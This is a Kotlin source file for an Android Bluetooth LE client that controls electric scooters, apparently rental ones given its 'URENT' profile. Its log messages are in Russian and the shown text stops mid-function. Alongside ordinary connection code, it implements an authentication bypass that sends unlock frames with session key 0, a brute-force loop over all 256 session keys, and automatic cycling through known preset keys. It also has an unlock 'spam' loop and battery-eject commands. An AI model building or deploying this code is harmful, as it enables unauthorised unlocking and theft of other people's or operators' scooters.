package ru.dany.scoot.core

import android.annotation.SuppressLint
import android.bluetooth.BluetoothGattCharacteristic
import android.content.Context
import android.os.Handler
import android.os.Looper
import java.util.Locale
import java.util.UUID
import kotlinx.coroutines.CompletableDeferred
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.withContext
import kotlinx.coroutines.withTimeoutOrNull
import ru.dany.scoot.ble.BleProfiles
import ru.dany.scoot.ble.BleTransport
import ru.dany.scoot.ble.DeviceKind
import ru.dany.scoot.ble.FrameCodec
import ru.dany.scoot.ble.GattDump
import ru.dany.scoot.ble.IotInfo
import ru.dany.scoot.ble.ScannedDevice
import ru.dany.scoot.ble.ScooterCodec
import ru.dany.scoot.ble.ScooterFrame
import ru.dany.scoot.ble.VehicleInfo
import ru.dany.scoot.ble.hex
import ru.dany.scoot.ble.hexByte
import ru.dany.scoot.ble.shortUuid

data class RemoteInfo(
    val name: String = "",
    val batteryPercent: Int? = null,
    val manufacturer: String = "",
    val model: String = "",
    val serial: String = "",
    val firmware: String = "",
    val hardware: String = "",
    val software: String = "",
    val txPower: Int? = null,
    val lastUuid: String = "",
    val lastHex: String = "",
)

data class BleNotification(
    val timeMs: Long,
    val uuid: UUID,
    val data: ByteArray,
)

enum class ClientState { IDLE, SCANNING, CONNECTING, DISCOVERING, AUTHENTICATING, READY, ERROR }

object ScooterClient : BleTransport.Listener {

    private const val TAG = "BLE"
    private const val AUTH_TAG = "AUTH"
    private const val SPAM_TAG = "SPAM"
    private const val GATT_TAG = "GATT"
    private const val EXT_TAG = "DEVICE"
    private const val AUTH_TIMEOUT_MS = 3000L
    private const val UNLOCK_TIMEOUT_MS = 3000L
    private const val BYPASS_TAG = "BYPASS"
    private const val BRUTE_INTERVAL_MS = 30L
    private const val NOTIFY_LIMIT = 120

    private const val CHAR_BATTERY = "00002a19-0000-1000-8000-00805f9b34fb"
    private const val CHAR_DEVICE_NAME = "00002a00-0000-1000-8000-00805f9b34fb"
    private const val CHAR_MODEL = "00002a24-0000-1000-8000-00805f9b34fb"
    private const val CHAR_SERIAL = "00002a25-0000-1000-8000-00805f9b34fb"
    private const val CHAR_FIRMWARE = "00002a26-0000-1000-8000-00805f9b34fb"
    private const val CHAR_HARDWARE = "00002a27-0000-1000-8000-00805f9b34fb"
    private const val CHAR_SOFTWARE = "00002a28-0000-1000-8000-00805f9b34fb"
    private const val CHAR_MANUFACTURER = "00002a29-0000-1000-8000-00805f9b34fb"
    private const val CHAR_TX_POWER = "00002a07-0000-1000-8000-00805f9b34fb"

    private lateinit var prefs: Prefs

    @SuppressLint("StaticFieldLeak")
    private var transport: BleTransport? = null
    private val handler = Handler(Looper.getMainLooper())
    private var rxBuffer = ByteArray(0)
    private var authPending = false
    private var authenticated = false
    private var authTimeout: Runnable? = null
    private var authKey = ""
    private val authTried = mutableSetOf<String>()
    private var unlockVariant = -1
    private var unlockKey = 0
    private var unlockTimeout: Runnable? = null
    private var spamRunning = false
    private var spamRunnable: Runnable? = null
    private var bypassPending = false
    private var bypassKey = 0
    private var bruteRunning = false
    private var bruteKey = 0
    private var bruteCurrent = -1
    private var bruteRunnable: Runnable? = null
    private var reconnectAttempts = 0
    private var reconnectRunnable: Runnable? = null
    private var linkLost = true
    private var wantedSpam = false
    private val pendingReads = HashMap<UUID, CompletableDeferred<ByteArray?>>()

    private val _state = MutableStateFlow(ClientState.IDLE)
    val state: StateFlow<ClientState> = _state.asStateFlow()

    private val _devices = MutableStateFlow<List<ScannedDevice>>(emptyList())
    val devices: StateFlow<List<ScannedDevice>> = _devices.asStateFlow()

    private val _vehicle = MutableStateFlow<VehicleInfo?>(null)
    val vehicle: StateFlow<VehicleInfo?> = _vehicle.asStateFlow()

    private val _iot = MutableStateFlow<IotInfo?>(null)
    val iot: StateFlow<IotInfo?> = _iot.asStateFlow()

    private val _remote = MutableStateFlow<RemoteInfo?>(null)
    val remote: StateFlow<RemoteInfo?> = _remote.asStateFlow()

    private val _notifications = MutableStateFlow<List<BleNotification>>(emptyList())
    val notifications: StateFlow<List<BleNotification>> = _notifications.asStateFlow()

    private val _spamActive = MutableStateFlow(false)
    val spamActive: StateFlow<Boolean> = _spamActive.asStateFlow()

    private val _spamSent = MutableStateFlow(0)
    val spamSent: StateFlow<Int> = _spamSent.asStateFlow()

    private val _lastError = MutableStateFlow("")
    val lastError: StateFlow<String> = _lastError.asStateFlow()

    private val _gatt = MutableStateFlow<GattDump?>(null)
    val gatt: StateFlow<GattDump?> = _gatt.asStateFlow()

    private val _incompatible = MutableStateFlow<Set<String>>(emptySet())
    val incompatible: StateFlow<Set<String>> = _incompatible.asStateFlow()

    var sessionKey: Int = 0
        private set

    var deviceName: String = ""
        private set

    var deviceAddress: String = ""
        private set

    var activeKind: DeviceKind = DeviceKind.OTHER
        private set

    val isScooter: Boolean get() = activeKind == DeviceKind.SCOOTER

    val isHeadset: Boolean get() = activeKind == DeviceKind.HEADSET

    val spamWanted: Boolean get() = wantedSpam

    val isReady: Boolean
        get() = _state.value == ClientState.READY && authenticated

    val hasLink: Boolean get() = isConnected()

    fun init(context: Context) {
        if (transport == null) {
            prefs = Prefs.get(context)
            transport = BleTransport(context.applicationContext).also {
                it.listener = this
                it.profile = BleProfiles.URENT
            }
        }
    }

    fun bluetoothSupported(): Boolean = transport?.isSupported == true

    fun bluetoothEnabled(): Boolean = transport?.isBluetoothEnabled == true

    fun startScan() {
        cancelReconnect()
        _devices.value = emptyList()
        _state.value = ClientState.SCANNING
        LogBus.info(TAG, "Сканирование запущено")
        val t = transport
        if (t == null) {
            _state.value = ClientState.IDLE
            LogBus.err(TAG, "Bluetooth не инициализирован")
            return
        }
        t.startScan()
    }

    fun stopScan() {
        transport?.stopScan()
        if (_state.value == ClientState.SCANNING) {
            _state.value = ClientState.IDLE
        }
    }

    fun connect(address: String, name: String, kind: DeviceKind = DeviceKind.SCOOTER) {
        cancelReconnect()
        val dump = _gatt.value
        if (dump != null && dump.address != address) _gatt.value = null
        linkLost = false
        rxBuffer = ByteArray(0)
        authPending = false
        authenticated = false
        authKey = ""
        authTried.clear()
        authTimeout?.let { handler.removeCallbacks(it) }
        authTimeout = null
        cancelUnlock()
        stopKeyBrute()
        bypassPending = false
        sessionKey = 0
        _lastError.value = ""
        _remote.value = null
        _notifications.value = emptyList()
        pendingReads.values.forEach { it.complete(null) }
        pendingReads.clear()
        stopSpam()
        val t = transport
        if (t == null) {
            _state.value = ClientState.IDLE
            LogBus.err(TAG, "Bluetooth не инициализирован")
            return
        }
        activeKind = kind
        deviceAddress = address
        deviceName = name.ifEmpty { address }
        prefs.lastDeviceAddress = address
        prefs.lastDeviceName = deviceName
        prefs.lastDeviceKind = kind
        reconnectAttempts = 0
        t.profile = BleProfiles.forKind(kind)
        t.allowAutoProfile = kind != DeviceKind.SCOOTER
        _state.value = ClientState.CONNECTING
        LogBus.info(TAG, "Подключение к $deviceName ($address, ${kindLabel(kind)})")
        t.connect(address)
    }

    fun disconnect() {
        cancelReconnect()
        linkLost = true
        stopSpam()
        wantedSpam = false
        reconnectAttempts = prefs.autoReconnectAttempts + 1
        transport?.disconnect()
        sessionKey = 0
        authPending = false
        authenticated = false
        authKey = ""
        authTried.clear()
        authTimeout?.let { handler.removeCallbacks(it) }
        authTimeout = null
        cancelUnlock()
        stopKeyBrute()
        bypassPending = false
        rxBuffer = ByteArray(0)
        pendingReads.values.forEach { it.complete(null) }
        pendingReads.clear()
        _remote.value = null
        _notifications.value = emptyList()
        _state.value = ClientState.IDLE
        LogBus.info(TAG, "Отключено")
    }

    private fun cancelReconnect() {
        reconnectRunnable?.let { handler.removeCallbacks(it) }
        reconnectRunnable = null
    }

    fun reconnectLast(): Boolean {
        val address = prefs.lastDeviceAddress
        if (address.isEmpty()) return false
        connect(address, prefs.lastDeviceName, prefs.lastDeviceKind)
        return true
    }

    fun hasLastDevice(): Boolean = prefs.lastDeviceAddress.isNotEmpty()

    fun authenticate() {
        if (activeKind != DeviceKind.SCOOTER) {
            LogBus.info(AUTH_TAG, "Устройство без авторизации по ключу")
            return
        }
        if (!isConnected()) {
            LogBus.warn(AUTH_TAG, "Нет подключения")
            return
        }
        authTried.clear()
        sendAuthKey(prefs.bleKey)
    }

    private fun sendAuthKey(key: String) {
        if (!isConnected()) {
            LogBus.warn(AUTH_TAG, "Нет подключения")
            return
        }
        authKey = key
        authTried.add(key)
        cancelUnlock()
        LogBus.info(AUTH_TAG, "Отправка ключа: ***")
        authPending = true
        _state.value = ClientState.AUTHENTICATING
        if (!writeFrame(ScooterCodec.keyCommand(key), "ключ")) {
            authPending = false
            authenticated = false
            tryNextAuthKey("Не удалось отправить кадр ключа")
            return
        }
        authTimeout?.let { handler.removeCallbacks(it) }
        val timeout = Runnable {
            if (authPending) {
                authPending = false
                authenticated = false
                sessionKey = 0
                LogBus.err(AUTH_TAG, "Таймаут авторизации")
                tryNextAuthKey("Таймаут авторизации")
            }
        }
        authTimeout = timeout
        handler.postDelayed(timeout, AUTH_TIMEOUT_MS)
    }

    private fun tryNextAuthKey(reason: String) {
        sessionKey = 0
        authenticated = false
        authTimeout?.let { handler.removeCallbacks(it) }
        authTimeout = null
        if (authKey !in ScooterCodec.KEY_PRESETS) {
            LogBus.err(AUTH_TAG, "$reason, ключ не подошел")
            _state.value = ClientState.READY
            return
        }
        val next = ScooterCodec.KEY_PRESETS.firstOrNull { it !in authTried }
        if (next == null) {
            LogBus.err(AUTH_TAG, "$reason, известные ключи не подошли")
            _state.value = ClientState.READY
            return
        }
        LogBus.warn(AUTH_TAG, "$reason, пробую другой известный ключ")
        sendAuthKey(next)
    }

    fun unlock() {
        val key = requireKey() ?: return
        cancelUnlock()
        unlockKey = key
        unlockVariant = 0
        sendUnlockVariant()
    }

    fun lock() {
        val key = requireKey() ?: return
        cancelUnlock()
        writeCommand(ScooterCodec.lockCommand(key), "блокировка")
    }

    fun ejectBattery() {
        val key = requireKey() ?: return
        writeCommand(ScooterCodec.ejectBatteryCommand(key), "изъятие батареи")
    }

    fun findCar() {
        val key = requireKey() ?: return
        writeCommand(ScooterCodec.findCarCommand(key), "поиск самоката")
    }

    fun setScooter(headlight: Boolean, modeIndex: Int, throttle: Boolean) {
        val key = requireKey() ?: return
        writeCommand(ScooterCodec.setScooterFromUi(key, headlight, modeIndex, throttle), "настройки самоката")
    }

    fun sendRaw(cmd: Int, payload: ByteArray) {
        val key = requireKey() ?: return
        writeCommand(FrameCodec.build(cmd, key, payload), "ручная команда ${hexByte(cmd)}")
    }

    fun sendService(cmd: Int, payload: ByteArray) {
        val key = requireKey() ?: return
        writeCommand(FrameCodec.build(cmd, key, payload), "сервис ${hexByte(cmd)}")
    }

    fun sendFrameKey(cmd: Int, payload: ByteArray, key: Int): Boolean {
        if (!isConnected()) {
            LogBus.warn(TAG, "Нет подключения")
            return false
        }
        return writeCommand(FrameCodec.build(cmd, key, payload), "кадр ${hexByte(cmd)} key ${hexByte(key)}")
    }

    fun sendProfileBytes(data: ByteArray): Boolean {
        if (!isConnected()) {
            LogBus.warn(TAG, "Нет подключения")
            return false
        }
        return writeFrame(data, "ручная запись")
    }

    fun readCharacteristic(uuid: UUID): Boolean = transport?.read(uuid) == true

    suspend fun readValue(uuid: UUID, timeoutMs: Long = 3500L): ByteArray? =
        withContext(Dispatchers.Main.immediate) {
            if (!isConnected()) return@withContext null
            val deferred = CompletableDeferred<ByteArray?>()
            pendingReads[uuid]?.complete(null)
            pendingReads[uuid] = deferred
            try {
                if (transport?.read(uuid) != true) return@withContext null
                withTimeoutOrNull(timeoutMs) { deferred.await() }
            } finally {
                if (pendingReads[uuid] === deferred) pendingReads.remove(uuid)
            }
        }

    fun writeCharacteristic(uuid: UUID, data: ByteArray, withoutResponse: Boolean? = null): Boolean =
        transport?.writeTo(uuid, data, withoutResponse) == true

    fun subscribeCharacteristic(uuid: UUID, enable: Boolean = true): Boolean =
        transport?.setNotify(uuid, enable) == true

    fun gattText(): String = _gatt.value?.toText().orEmpty()

    fun recentNotifications(limit: Int): List<BleNotification> =
        _notifications.value.takeLast(limit.coerceIn(1, NOTIFY_LIMIT))

    fun refreshRemoteInfo() {
        if (!isConnected() || activeKind == DeviceKind.SCOOTER) return
        val available = _gatt.value?.services
            ?.flatMap { service -> service.characteristics.map { it.uuid.toString() } }
            ?.toSet()
            ?: return
        val wanted = listOf(
            CHAR_DEVICE_NAME,
            CHAR_BATTERY,
            CHAR_MANUFACTURER,
            CHAR_MODEL,
            CHAR_SERIAL,
            CHAR_FIRMWARE,
            CHAR_HARDWARE,
            CHAR_SOFTWARE,
            CHAR_TX_POWER,
        )
        val targets = wanted.filter { available.contains(it) }
        targets.forEachIndexed { index, text ->
            handler.postDelayed({
                if (isConnected()) transport?.read(UUID.fromString(text))
            }, 150L + index * 220L)
        }
    }

    fun bypassUnlock() {
        if (activeKind != DeviceKind.SCOOTER) {
            LogBus.warn(BYPASS_TAG, "Команда только для самоката")
            return
        }
        if (!isConnected()) {
            LogBus.warn(BYPASS_TAG, "Нет подключения")
            return
        }
        cancelUnlock()
        stopKeyBrute()
        bypassPending = true
        bypassKey = 0
        LogBus.warn(BYPASS_TAG, "Unlock без авторизации, key 0")
        writeFrame(ScooterCodec.unlockCommand(0), "unlock key 0")
        handler.postDelayed({
            if (bypassPending) {
                writeFrame(ScooterCodec.unlockCommandTimestamp(0, System.currentTimeMillis()), "unlock key 0 timestamp")
            }
        }, 500)
        handler.postDelayed({ bypassPending = false }, 3500)
    }

    fun startKeyBrute() {
        if (activeKind != DeviceKind.SCOOTER) {
            LogBus.warn(BYPASS_TAG, "Команда только для самоката")
            return
        }
        if (!isConnected()) {
            LogBus.warn(BYPASS_TAG, "Нет подключения")
            return
        }
        if (bruteRunning) return
        cancelUnlock()
        bypassPending = false
        bruteRunning = true
        bruteKey = 0
        bruteCurrent = -1
        LogBus.warn(BYPASS_TAG, "Перебор session key 0..255")
        val runnable = object : Runnable {
            override fun run() {
                if (!bruteRunning) return
                if (!isConnected()) {
                    stopKeyBrute()
                    return
                }
                if (bruteKey > 0xFF) {
                    stopKeyBrute()
                    LogBus.warn(BYPASS_TAG, "Перебор завершен без успеха")
                    return
                }
                bruteCurrent = bruteKey
                val key = bruteKey
                bruteKey += 1
                writeFrame(ScooterCodec.unlockCommand(key), null)
                if (key % 16 == 0) {
                    LogBus.info(BYPASS_TAG, "Перебор: 0x${hexByte(key)}")
                }
                handler.postDelayed(this, BRUTE_INTERVAL_MS)
            }
        }
        bruteRunnable = runnable
        handler.post(runnable)
    }

    fun stopKeyBrute() {
        if (!bruteRunning) return
        bruteRunning = false
        bruteRunnable?.let { handler.removeCallbacks(it) }
        bruteRunnable = null
        bruteCurrent = -1
        LogBus.info(BYPASS_TAG, "Перебор остановлен")
    }

    private fun acceptSessionKey(key: Int, message: String) {
        sessionKey = key
        authenticated = true
        reconnectAttempts = 0
        _incompatible.value = _incompatible.value - deviceAddress
        _state.value = ClientState.READY
        LogBus.ok(BYPASS_TAG, message)
        onAuthenticated()
    }

    fun startSpam() {
        if (activeKind != DeviceKind.SCOOTER) {
            LogBus.warn(SPAM_TAG, "Спам доступен только для самоката")
            return
        }
        if (spamRunning) return
        if (!isReady) {
            LogBus.warn(SPAM_TAG, "Сначала авторизуйтесь")
            return
        }
        cancelUnlock()
        wantedSpam = true
        spamRunning = true
        _spamActive.value = true
        _spamSent.value = 0
        LogBus.ok(SPAM_TAG, "Спам разблокировки запущен (${prefs.spamIntervalMs} мс)")
        val runnable = object : Runnable {
            override fun run() {
                if (!spamRunning) return
                spamTick()
                val interval = prefs.spamIntervalMs.coerceIn(Prefs.MIN_SPAM_INTERVAL, Prefs.MAX_SPAM_INTERVAL)
                handler.postDelayed(this, interval.toLong())
            }
        }
        spamRunnable = runnable
        handler.post(runnable)
    }

    fun stopSpam() {
        wantedSpam = false
        if (!spamRunning) {
            _spamActive.value = false
            return
        }
        spamRunning = false
        spamRunnable?.let { handler.removeCallbacks(it) }
        spamRunnable = null
        _spamActive.value = false
        LogBus.info(SPAM_TAG, "Спам разблокировки остановлен, отправлено ${_spamSent.value}")
    }

    private fun spamTick() {
        if (!isReady) return
        val frame = ScooterCodec.spamUnlockCommand(sessionKey, System.currentTimeMillis())
        if (writeFrame(frame, null)) {
            _spamSent.value += 1
        }
    }

    private fun requireKey(): Int? {
        if (activeKind != DeviceKind.SCOOTER) {
            LogBus.warn(TAG, "Действие доступно только для самоката")
            return null
        }
        if (!isReady) {
            val text = if (_state.value == ClientState.READY) "Требуется авторизация" else "Нет подключения"
            LogBus.warn(TAG, text)
            return null
        }
        return sessionKey
    }

    private fun isConnected(): Boolean =
        transport != null && _state.value != ClientState.IDLE && _state.value != ClientState.CONNECTING &&
            _state.value != ClientState.SCANNING && _state.value != ClientState.ERROR

    private fun writeCommand(frame: ByteArray, label: String): Boolean = writeFrame(frame, label)

    private fun sendUnlockVariant() {
        if (!isReady) {
            cancelUnlock()
            return
        }
        val frame = when (unlockVariant) {
            0 -> ScooterCodec.unlockCommand(unlockKey)
            1 -> ScooterCodec.unlockCommandTimestamp(unlockKey, System.currentTimeMillis())
            else -> return
        }
        val label = if (unlockVariant == 0) "разблокировка 10x01" else "разблокировка timestamp"
        if (!writeCommand(frame, label)) {
            cancelUnlock()
            return
        }
        scheduleUnlockTimeout()
    }

    private fun scheduleUnlockTimeout() {
        unlockTimeout?.let { handler.removeCallbacks(it) }
        val timeout = Runnable {
            unlockTimeout = null
            when (unlockVariant) {
                0 -> {
                    LogBus.warn("UNLOCK", "Нет ответа на 10x01, повтор с timestamp")
                    unlockVariant = 1
                    sendUnlockVariant()
                }
                1 -> {
                    unlockVariant = -1
                    unlockKey = 0
                    LogBus.err("UNLOCK", "Нет ответа на оба варианта разблокировки")
                }
            }
        }
        unlockTimeout = timeout
        handler.postDelayed(timeout, UNLOCK_TIMEOUT_MS)
    }

    private fun retryUnlock(reason: String) {
        if (unlockVariant != 0 || spamRunning) return
        unlockTimeout?.let { handler.removeCallbacks(it) }
        unlockTimeout = null
        LogBus.warn("UNLOCK", "$reason, повтор с timestamp")
        unlockVariant = 1
        sendUnlockVariant()
    }

    private fun cancelUnlock() {
        unlockTimeout?.let { handler.removeCallbacks(it) }
        unlockTimeout = null
        unlockVariant = -1
        unlockKey = 0
    }

    private fun writeFrame(frame: ByteArray, label: String?): Boolean {
        val ok = transport?.write(frame) == true
        if (ok) {
            LogBus.tx("TX", buildString {
                if (label != null) append(label).append(": ")
                append(hex(frame))
            })
        } else {
            LogBus.err("TX", "Не удалось отправить кадр: ${hex(frame)}")
        }
        return ok
    }

    override fun onDevice(device: ScannedDevice) {
        handler.post { handleDevice(device) }
    }

    private fun handleDevice(device: ScannedDevice) {
        val current = _devices.value
        val existing = current.indexOfFirst { it.address == device.address }
        val list = ArrayList(current)
        if (existing >= 0) {
            val old = list[existing]
            list[existing] = device.copy(
                name = if (device.name == "Unknown") old.name else device.name,
                hasUart = old.hasUart || device.hasUart,
                hasEdifier = old.hasEdifier || device.hasEdifier,
                kind = if (device.kind == DeviceKind.OTHER) old.kind else device.kind,
            )
        } else {
            val unknown = device.name.isBlank() || device.name == "Unknown"
            if (prefs.hideUnknownDevices && unknown && device.kind == DeviceKind.OTHER) return
            if (!prefs.showAllDevices && device.kind == DeviceKind.OTHER) return
            list.add(device)
            if (prefs.showScanLog) {
                LogBus.info(
                    "SCAN",
                    "${device.name} ${device.address} RSSI=${device.rssi} ${device.kind} ${device.advert}",
                )
            }
        }
        _devices.value = list
    }

    override fun onScanFinished() {
        handler.post { handleScanFinished() }
    }

    private fun handleScanFinished() {
        if (_state.value == ClientState.SCANNING) {
            _state.value = ClientState.IDLE
        }
        LogBus.info(TAG, "Сканирование завершено, найдено ${_devices.value.size}")
    }

    override fun onConnected() {
        handler.post { handleConnected() }
    }

    private fun handleConnected() {
        linkLost = false
        _state.value = ClientState.DISCOVERING
        LogBus.ok(TAG, "Подключено к $deviceName")
    }

    override fun onServicesReady(write: BluetoothGattCharacteristic, notify: BluetoothGattCharacteristic) {
        handler.post {
            if (deviceAddress.isNotEmpty()) {
                _incompatible.value = _incompatible.value - deviceAddress
            }
            LogBus.info(TAG, "Сервисы готовы, канал уведомлений включен")
            if (activeKind == DeviceKind.SCOOTER) {
                authenticate()
            } else {
                authenticated = true
                _state.value = ClientState.READY
                LogBus.ok(EXT_TAG, "Канал ${kindLabel(activeKind)} готов")
                refreshRemoteInfo()
            }
        }
    }

    override fun onGattDump(dump: GattDump) {
        handler.post {
            _gatt.value = dump
            LogBus.info(GATT_TAG, "Сервисы (${dump.services.size}): ${dump.summary()}")
        }
    }

    override fun onCharacteristicRead(uuid: UUID, value: ByteArray) {
        handler.post { handleCharacteristicRead(uuid, value) }
    }

    private fun handleCharacteristicRead(uuid: UUID, value: ByteArray) {
        LogBus.info(TAG, "Read ${shortUuid(uuid)}: ${hex(value)}")
        pendingReads.remove(uuid)?.complete(value.copyOf())
        updateRemote(uuid, value)
    }

    override fun onFrame(uuid: UUID, data: ByteArray) {
        handler.post { handleFrame(uuid, data) }
    }

    private fun handleFrame(uuid: UUID, data: ByteArray) {
        if (uuid == BleTransport.UART_TX_CHAR) {
            processFrame(data)
            return
        }
        LogBus.rx("RX", "${shortUuid(uuid)}: ${hex(data)}")
        appendNotification(uuid, data)
        updateRemote(uuid, data)
    }

    private fun appendNotification(uuid: UUID, data: ByteArray) {
        val list = ArrayList(_notifications.value)
        list.add(BleNotification(System.currentTimeMillis(), uuid, data.copyOf()))
        if (list.size > NOTIFY_LIMIT) list.subList(0, list.size - NOTIFY_LIMIT).clear()
        _notifications.value = list
    }

    private fun updateRemote(uuid: UUID, value: ByteArray) {
        val key = uuid.toString()
        val current = _remote.value ?: RemoteInfo()
        val text = ascii(value)
        val updated = when (key) {
            CHAR_BATTERY -> {
                val battery = value.firstOrNull()?.toInt()?.and(0xFF)
                current.copy(batteryPercent = battery)
            }
            CHAR_DEVICE_NAME -> current.copy(name = text)
            CHAR_MANUFACTURER -> current.copy(manufacturer = text)
            CHAR_MODEL -> current.copy(model = text)
            CHAR_SERIAL -> current.copy(serial = text)
            CHAR_FIRMWARE -> current.copy(firmware = text)
            CHAR_HARDWARE -> current.copy(hardware = text)
            CHAR_SOFTWARE -> current.copy(software = text)
            CHAR_TX_POWER -> {
                val power = value.firstOrNull()?.toInt()?.and(0xFF) ?: current.txPower ?: 0
                current.copy(txPower = power)
            }
            else -> current
        }
        _remote.value = updated.copy(lastUuid = shortUuid(uuid), lastHex = hex(value))
    }

    private fun ascii(value: ByteArray): String {
        var end = value.size
        while (end > 0 && value[end - 1].toInt() == 0) end--
        return String(value, 0, end, Charsets.UTF_8).trim()
    }

    private fun processFrame(data: ByteArray) {
        rxBuffer += data
        val (frames, rest) = FrameCodec.findFrames(rxBuffer)
        rxBuffer = rest
        if (rxBuffer.size > 1024) {
            LogBus.warn(TAG, "Переполнение буфера приёма, сброс")
            rxBuffer = ByteArray(0)
        }
        for (frame in frames) {
            handleFrame(frame)
        }
    }

    override fun onDisconnected(reason: String) {
        handler.post { handleDisconnected(reason) }
    }

    private fun handleDisconnected(reason: String) {
        if (linkLost) return
        linkLost = true
        cancelReconnect()
        _state.value = ClientState.IDLE
        sessionKey = 0
        authPending = false
        authenticated = false
        authKey = ""
        authTried.clear()
        authTimeout?.let { handler.removeCallbacks(it) }
        authTimeout = null
        cancelUnlock()
        stopKeyBrute()
        bypassPending = false
        rxBuffer = ByteArray(0)
        pendingReads.values.forEach { it.complete(null) }
        pendingReads.clear()
        _remote.value = null
        _spamActive.value = false
        LogBus.warn(TAG, "Соединение потеряно ($reason)")
        if (spamRunning) {
            spamRunning = false
            spamRunnable?.let { handler.removeCallbacks(it) }
            spamRunnable = null
        }
        if (!prefs.autoResumeSpam) {
            wantedSpam = false
        }
        val fatal = transport?.lastFailureIsFatal == true
        val canReconnect = !fatal && prefs.autoReconnect && reconnectAttempts < prefs.autoReconnectAttempts &&
            deviceAddress.isNotEmpty()
        if (canReconnect) {
            reconnectAttempts += 1
            LogBus.info(TAG, "Переподключение $reconnectAttempts/${prefs.autoReconnectAttempts} через ${prefs.autoReconnectDelayMs} мс")
            val runnable = Runnable {
                reconnectRunnable = null
                if (deviceAddress.isNotEmpty()) {
                    linkLost = false
                    _state.value = ClientState.CONNECTING
                    transport?.connect(deviceAddress)
                }
            }
            reconnectRunnable = runnable
            handler.postDelayed(runnable, prefs.autoReconnectDelayMs.toLong())
        } else {
            wantedSpam = false
        }
    }

    override fun onError(message: String) {
        handler.post { handleError(message) }
    }

    private fun handleError(message: String) {
        _lastError.value = message
        LogBus.err(TAG, message)
        if (message.contains("not found") || message.contains("не найден")) {
            if (deviceAddress.isNotEmpty()) {
                _incompatible.value = _incompatible.value + deviceAddress
            }
            LogBus.warn(
                GATT_TAG,
                "Устройство не отдало Nordic UART или Edifier канал. Полный список сервисов выше",
            )
        }
    }

    private fun handleFrame(frame: ScooterFrame) {
        LogBus.rx("RX", "CMD=${hexByte(frame.cmd)} ${hex(frame.raw)}")
        when (frame.cmd) {
            ScooterCodec.CMD_KEY -> handleAuthFrame(frame)
            ScooterCodec.CMD_ERROR -> {
                val rejected = frame.payload.getOrNull(0)?.toInt()?.and(0xFF)
                val reason = frame.payload.getOrNull(1)?.toInt()?.and(0xFF)
                val message = when {
                    rejected == null -> "Самокат сообщил об ошибке без деталей"
                    reason == null -> "Самокат отклонил команду 0x${hexByte(rejected)}"
                    else -> "Самокат отклонил команду 0x${hexByte(rejected)}, причина 0x${hexByte(reason)}"
                }
                LogBus.err("SCOOTER", message)
                if (rejected == ScooterCodec.CMD_UNLOCK) retryUnlock("Команда 0x05 отклонена")
            }
            ScooterCodec.CMD_UNLOCK -> handleUnlockFrame(frame)
            ScooterCodec.CMD_LOCK -> reportLock(frame, "Самокат заблокирован", "Ошибка блокировки")
            ScooterCodec.CMD_SCOOTER_SET -> {
                val ok = frame.payload.isNotEmpty() && frame.payload[0].toInt() == 0
                LogBus.log(
                    if (ok) LogLevel.OK else LogLevel.WARN, "SCOOTER",
                    if (ok) "Настройки применены" else "Настройки не применены",
                )
            }
            ScooterCodec.CMD_EJECT_BATTERY -> {
                val ok = ScooterCodec.isEjectSuccess(frame.payload)
                LogBus.log(
                    if (ok) LogLevel.OK else LogLevel.WARN, "SCOOTER",
                    if (ok) "Успешное изъятие батареи" else "Ошибка изъятия батареи",
                )
            }
            ScooterCodec.CMD_DEVICE_INFO -> handleDeviceInfo(frame)
            ScooterCodec.CMD_SCOOTER_INFO -> {
                val info = ScooterCodec.parseVehicleInfo(frame.payload)
                if (info != null) {
                    _vehicle.value = info
                    LogBus.info(
                        "INFO",
                        "Батарея ${info.batteryPercent}%, режим ${info.mode}, скорость ${info.speed}, пробег ${info.singleMileage} м, запас ${info.remainingRange} м",
                    )
                }
            }
            ScooterCodec.CMD_RFID -> {
                val card = ScooterCodec.parseRfid(frame.payload)
                if (card != null) {
                    LogBus.info("RFID", "Карта: $card (0x${"%08X".format(Locale.ROOT, card)})")
                }
            }
            ScooterCodec.CMD_REALTIME -> {
                val info = ScooterCodec.parseRealtime(frame.payload)
                if (info != null) {
                    val old = _vehicle.value
                    _vehicle.value = VehicleInfo(
                        batteryPercent = info.batteryPercent,
                        mode = old?.mode ?: 0,
                        speed = info.speed,
                        singleMileage = old?.singleMileage ?: 0,
                        remainingRange = old?.remainingRange ?: 0,
                    )
                    LogBus.info(
                        "INFO",
                        "Реальное время: батарея ${info.batteryPercent}%, скорость ${"%.1f".format(Locale.ROOT, info.speed)} км/ч, ток ${"%.2f".format(Locale.ROOT, info.current)} А, флаги 0x${hexByte(info.flags)}",
                    )
                }
            }
            ScooterCodec.CMD_RFID_DELETE -> {
                val pair = ScooterCodec.parseRfidPair(frame.payload)
                if (pair != null) {
                    LogBus.info(
                        "RFID",
                        "Удаление карт: 0x${"%08X".format(Locale.ROOT, pair.first)}, 0x${"%08X".format(Locale.ROOT, pair.second)}",
                    )
                }
            }
            ScooterCodec.CMD_FW_INFO -> handleFirmwareInfo(frame)
            ScooterCodec.CMD_FW_STATUS -> handleFirmwareStatus(frame)
            ScooterCodec.CMD_FW_PACK -> {
                val index = if (frame.payload.size >= 2) {
                    ((frame.payload[0].toInt() and 0xFF) shl 8) or (frame.payload[1].toInt() and 0xFF)
                } else {
                    -1
                }
                LogBus.info("FW", "Запрос пакета прошивки: $index")
            }
            else -> LogBus.info("RX", "Команда ${hexByte(frame.cmd)}: ${hex(frame.payload)}")
        }
    }

    private fun handleFirmwareInfo(frame: ScooterFrame) {
        val text = String(frame.payload, Charsets.UTF_8).trimEnd('\u0000').trim()
        if (text.isNotEmpty() && text.all { it == '\n' || it == '\r' || it == '\t' || it in ' '..'~' }) {
            LogBus.info("FW", text)
        } else {
            LogBus.info("FW", "Информация о прошивке: ${hex(frame.payload)}")
        }
    }

    private fun handleFirmwareStatus(frame: ScooterFrame) {
        val code = frame.payload.firstOrNull()?.toInt()?.and(0xFF) ?: -1
        val text = when (code) {
            0 -> "ошибка ключа или пароля"
            1 -> "устройство готово"
            2 -> "передача завершена"
            3 -> "таймаут приёма"
            4 -> "ошибка CRC всего образа"
            else -> "статус $code"
        }
        LogBus.log(if (code == 2) LogLevel.OK else LogLevel.INFO, "FW", "Передача прошивки: $text")
    }

    private fun reportLock(frame: ScooterFrame, okText: String, failText: String) {
        val code = frame.payload.firstOrNull()?.toInt()?.and(0xFF)
        val ok = ScooterCodec.isLockStatusSuccess(frame.payload)
        val detail = if (code == null) "ACK" else "код 0x${hexByte(code)}"
